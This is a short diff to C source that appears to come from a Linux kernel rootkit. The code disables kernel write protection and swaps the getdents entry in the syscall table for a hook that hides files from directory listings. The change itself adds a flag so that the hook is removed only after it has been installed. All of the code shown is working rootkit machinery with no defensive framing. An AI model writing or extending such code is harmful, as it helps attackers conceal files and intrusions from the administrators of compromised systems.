@@ -14,6 +14,8 @@ struct linux_dirent {
 	char d_name[];
 };
 
+static int files_hidden = 0;
+
 static int (*orig_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
 int my_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
@@ -38,11 +40,14 @@ void hide_files(){
 	disable_wp();
 	orig_sys_getdents = syscall_table[__NR_getdents];
 	syscall_table[__NR_getdents] = my_getdents;
+	files_hidden = 1;
 	enable_wp();
 }
 
 void unhide_files(){
-	disable_wp();
-	syscall_table[__NR_getdents] = orig_sys_getdents;
-	enable_wp();
+	if(files_hidden == 1){
+		disable_wp();
+		syscall_table[__NR_getdents] = orig_sys_getdents;
+		enable_wp();
+	}
 }	
